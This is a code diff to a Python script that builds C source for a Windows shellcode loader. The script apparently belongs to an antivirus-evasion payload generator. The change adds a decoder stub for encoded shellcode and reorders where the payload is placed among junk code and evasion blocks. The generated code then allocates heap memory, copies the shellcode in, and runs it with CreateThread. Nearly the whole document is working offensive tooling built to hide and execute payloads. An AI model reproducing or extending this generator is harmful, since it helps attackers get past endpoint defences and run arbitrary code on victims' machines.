@@ -37,7 +37,11 @@ Encryption = sys.argv[3]
 
 Randbufname = varname_creator()
 
-Payload = encoding_manager(Encryption,Payload,Randbufname) 
+DecodeKit = encoding_manager(Encryption,Payload,Randbufname)
+
+Payload = DecodeKit[0]     # encoded shellcode 
+
+DecoderStub = DecodeKit[1] # decoder stub or string = False if decoder is not necessary
 
 Randmem = varname_creator()
 
@@ -107,13 +111,13 @@ Hollow_code += Junkcode_04
 Hollow_code += WinEvasion_04
 Hollow_code += Junkcode_05
 Hollow_code += WinEvasion_05
+Hollow_code += Payload
 Hollow_code += Junkcode_06
 Hollow_code += spawn_multiple_process(SpawnMultiProc)
 Hollow_code += "DWORD " + Randresult + ";\n"
 Hollow_code += "HANDLE " + Randheapvar + ";LPVOID " + Randlpv + ";HANDLE " + Randhand + ";\n"
 Hollow_code += "DWORD " + Randthread + ";\n"
 Hollow_code += Junkcode_07
-Hollow_code += Payload
 Hollow_code += Junkcode_08
 Hollow_code += "HINSTANCE " + Ker32 + " = LoadLibrary(\"kernel32.dll\");\n"
 Hollow_code += Junkcode_09
@@ -127,6 +131,8 @@ Hollow_code += "FARPROC " + NdcHeapalloc + " = GetProcAddress(" + Ker32 + ", \"H
 Hollow_code += Junkcode_13
 Hollow_code += Randlpv + " = (LPVOID)" + NdcHeapalloc + "(" + Randheapvar + ", 0x00000008, strlen(" + Randbufname + "));\n"
 Hollow_code += Junkcode_14
+if DecoderStub != "False":
+    Hollow_code += DecoderStub
 Hollow_code += "RtlMoveMemory(" + Randlpv +","+ Randbufname + ",strlen(" + Randbufname + "));\n"
 Hollow_code += Junkcode_15
 Hollow_code += Randhand + " = CreateThread(NULL,0," + Randlpv + ",NULL,0,&"+ Randthread + ");\n"
